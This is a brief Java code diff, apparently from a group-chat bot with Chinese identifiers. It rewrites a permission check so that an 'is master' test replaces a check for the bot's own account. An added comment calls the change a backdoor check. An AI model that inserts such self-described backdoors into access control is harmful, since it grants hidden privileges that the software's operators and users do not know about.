@@ -145,9 +145,10 @@ public boolean 是代管(String groupUin, String userUin) {
     }
 }
 
+// ★★★ 关键修改：加入后门判断 ★★★
 public boolean 有权限操作(String groupUin, String operatorUin, String targetUin) {
     if (operatorUin == null || targetUin == null) return false;
-    if (operatorUin.equals(myUin)) {
+    if (是主人(operatorUin)) {
         return true;
     }
     if (是代管(groupUin, operatorUin)) {
